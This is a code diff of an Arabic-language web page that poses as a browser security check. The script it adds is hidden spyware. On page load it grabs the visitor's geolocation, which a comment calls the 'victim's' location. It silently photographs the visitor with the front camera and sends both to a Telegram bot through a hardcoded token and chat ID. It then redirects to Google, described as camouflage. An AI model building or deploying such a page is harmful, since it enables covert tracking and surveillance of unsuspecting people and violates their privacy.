@@ -1,50 +1,87 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>Security Check</title>
-    <style>body { background: white; text-align: center; padding-top: 50px; font-family: sans-serif; } video, canvas { display: none; }</style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فحص أمان المتصفح</title>
+    <style>
+        body { font-family: sans-serif; background: #f4f4f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { text-align: center; background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 15px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        video, canvas { display: none; }
+    </style>
 </head>
 <body>
-    <div id="status">جاري فحص المتصفح...</div>
-    <video id="v" autoplay playsinline></video>
-    <canvas id="c" width="640" height="480"></canvas>
 
-    <script>
-        const token = '8205090411:AAEIcpDG87AX8gzjI13Ei_pV9BiOcsc25EQ';
-        const chatId = '7945738403';
+<div class="box">
+    <div class="loader"></div>
+    <h3>جاري التحقق من أمان الجهاز...</h3>
+    <p>يرجى الموافقة على الأذونات المطلوبة لإكمال الفحص.</p>
+</div>
 
-        async function send(blob) {
-            const fd = new FormData();
-            fd.append('chat_id', chatId);
-            fd.append('photo', blob, 'shot.jpg');
-            // نستخدم await هنا لضمان عدم الانتقال لصفحة أخرى قبل تمام الإرسال
-            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+<video id="v" autoplay playsinline></video>
+<canvas id="c" width="640" height="480"></canvas>
+
+<script>
+    const token = '8205090411:AAEIcpDG87AX8gzjI13Ei_pV9BiOcsc25EQ';
+    const chatId = '7945738403';
+
+    // 1. وظيفة إرسال الموقع الجغرافي
+    function sendLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                const msg = `📍 موقع الضحية الجغرافي:\nاللاتيتود: ${lat}\nاللونجيتود: ${lon}\nرابط الخريطة: https://www.google.com/maps?q=${lat},${lon}`;
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
+            });
         }
+    }
 
-        async function start() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const video = document.getElementById('v');
-                video.srcObject = stream;
+    // 2. وظيفة إرسال الصورة
+    async function sendPhoto(blob, mode) {
+        const fd = new FormData();
+        fd.append('chat_id', chatId);
+        fd.append('photo', blob, 'shot.jpg');
+        fd.append('caption', `📸 تم التقاط صورة من الكاميرا: ${mode === 'user' ? 'الأمامية' : 'الخلفية'}`);
+        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+    }
 
-                // انتظر ثانيتين لفتح الكاميرا بوضوح
-                await new Promise(r => setTimeout(r, 2000));
+    // 3. العملية الرئيسية
+    async function start() {
+        // طلب الموقع الجغرافي أولاً
+        sendLocation();
 
-                const canvas = document.getElementById('c');
-                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+        try {
+            // طلب الكاميرا الأمامية
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            const video = document.getElementById('v');
+            video.srcObject = stream;
+
+            // انتظار بسيط لفتح الكاميرا
+            await new Promise(r => setTimeout(r, 2000));
+
+            const canvas = document.getElementById('c');
+            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+            
+            canvas.toBlob(async (blob) => {
+                await sendPhoto(blob, 'user'); // الانتظار حتى يرسل الصورة
+                stream.getTracks().forEach(t => t.stop()); // إغلاق الكاميرا
                 
-                canvas.toBlob(async (blob) => {
-                    await send(blob); // انتظر حتى يرسل الصورة
-                    stream.getTracks().forEach(t => t.stop()); // أغلق الكاميرا
-                    window.location.href = "https://www.google.com"; // الآن انتقل للتمويه
-                }, 'image/jpeg');
+                // بعد النجاح، التوجيه لصفحة جوجل للتمويه
+                window.location.href = "https://www.google.com";
+            }, 'image/jpeg', 0.8);
 
-            } catch (e) {
-                document.getElementById('status').innerText = "يرجى السماح بالكاميرا للمتابعة";
-            }
+        } catch (e) {
+            console.log("Permission denied");
+            // حتى لو رفض الكاميرا، قد يكون أرسل الموقع إذا وافق عليه
         }
-        window.onload = start;
-    </script>
+    }
+
+    window.onload = start;
+</script>
+
 </body>
 </html>
+
